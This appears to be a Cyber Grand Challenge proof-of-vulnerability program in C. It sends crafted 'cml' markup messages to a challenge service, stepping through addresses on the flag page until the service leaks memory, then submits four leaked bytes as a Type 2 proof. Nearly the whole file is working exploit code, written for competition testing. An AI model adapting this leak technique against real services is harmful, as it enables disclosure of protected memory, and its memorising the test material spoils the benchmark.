#include "libpov.h"
// \x00<> =/&\x01\x00\x48<cml><cml><\x01\xc0\x47\x43AAAAAAAAYYYY></\x01\xc0\x47\x43AAAAAAAAYYYY><XXXX></XXXX></cml></cml>\x07\x01\x00\x00\x00\x00\x05\x04\x04\x84\x00\x01\x06\x02\x00\x00\x00

unsigned char *cgc_memchr(unsigned char *buf, int c, cgc_size_t n)
{
    cgc_size_t i;
    for (i = 0; i < n; i++)
        if (buf[i] == c)
            return &buf[i];
    return 0;
}

int main(int cgc_argc, char *cgc_argv[])
{
    unsigned char chars[6];
    unsigned char buf[128];
    unsigned char tmp[16];
    unsigned int i, size, addr = 0x4347C001, desc = 0;
    cgc_size_t bytes;
    type2_vals t2;
    cgc_type2_negotiate(&t2);

next_addr:
    do
    {
    try_again:
        cgc_random(chars, sizeof(chars), &bytes);
        for (i = 0; i < sizeof(chars); i++)
        {
            if (chars[i] == 0)
                goto try_again;
            if (cgc_memchr((void*)&addr, chars[i], 4) != 0)
                goto try_again;
            if (cgc_memchr((void*)"cml", chars[i], 3) != 0)
                goto try_again;
            if (cgc_memchr(&chars[i + 1], chars[i], sizeof(chars) - i - 1) != 0)
                goto try_again;
        }
    } while (0);

    i = 0;
    buf[i++] = 0x00;
    buf[i++] = chars[0];
    buf[i++] = chars[1];
    buf[i++] = chars[2];
    buf[i++] = chars[3];
    buf[i++] = chars[4];
    buf[i++] = chars[5];
    cgc_transmit_all(STDOUT, buf, i);

    cgc_random(tmp, 16, &bytes);
    for (i = 0; i < 16; i++)
    {
        while (cgc_memchr(chars, tmp[i], 6) != 0 || tmp[i] == 0)
            tmp[i]++;
    }
    i = 0;
    buf[i++] = 0x01;
    buf[i++] = 0x00;
    buf[i++] = 0x48;
    buf[i++] = chars[0];
    buf[i++] = 'c';
    buf[i++] = 'm';
    buf[i++] = 'l';
    buf[i++] = chars[1];
    buf[i++] = chars[0];
    buf[i++] = 'c';
    buf[i++] = 'm';
    buf[i++] = 'l';
    buf[i++] = chars[1];
    buf[i++] = chars[0];
    *(unsigned int *)&buf[i] = addr;
    i += 4;
    cgc_memcpy(&buf[i], tmp, 12);
    i += 12;
    buf[i++] = chars[1];
    buf[i++] = chars[0];
    buf[i++] = chars[4];
    *(unsigned int *)&buf[i] = addr;
    i += 4;
    cgc_memcpy(&buf[i], tmp, 12);
    i += 12;
    buf[i++] = chars[1];
    buf[i++] = chars[0];
    cgc_memcpy(&buf[i], tmp+12, 4);
    i += 4;
    buf[i++] = chars[1];
    buf[i++] = chars[0];
    buf[i++] = chars[4];
    cgc_memcpy(&buf[i], tmp+12, 4);
    i += 4;
    buf[i++] = chars[1];
    buf[i++] = chars[0];
    buf[i++] = chars[4];
    buf[i++] = 'c';
    buf[i++] = 'm';
    buf[i++] = 'l';
    buf[i++] = chars[1];
    buf[i++] = chars[0];
    buf[i++] = chars[4];
    buf[i++] = 'c';
    buf[i++] = 'm';
    buf[i++] = 'l';
    buf[i++] = chars[1];
    cgc_transmit_all(STDOUT, buf, i);
    desc++;

    cgc_memcpy(buf, "\x07\x01\x00\x00\x00\x00\x05\x04\x04\x84\x00\x01", 12);
    *(unsigned int *)&buf[1] = desc;
    cgc_transmit_all(STDOUT, buf, 12);
    desc++;

    cgc_memcpy(buf, "\x06\x02\x00\x00\x00", 5);
    *(unsigned int *)&buf[1] = desc;
    cgc_transmit_all(STDOUT, buf, 5);

    cgc_length_read(STDIN, buf, 12);
    if (buf[11] == 0x00)
    {
        cgc_length_read(STDIN, buf, 2);
        size = buf[0] * 256 + buf[1];
    }
    else
    {
        size = 0;
    }
    if (size < 4)
    {
        if (size)
            cgc_length_read(STDIN, buf, size);
        if (addr < 0x4347C011)
        {
            addr += 4;
            goto next_addr;
        }
    }
    else
    {
        cgc_length_read(STDIN, buf, 4);
    }
    cgc_type2_submit(buf, 4);
    return 0;
}
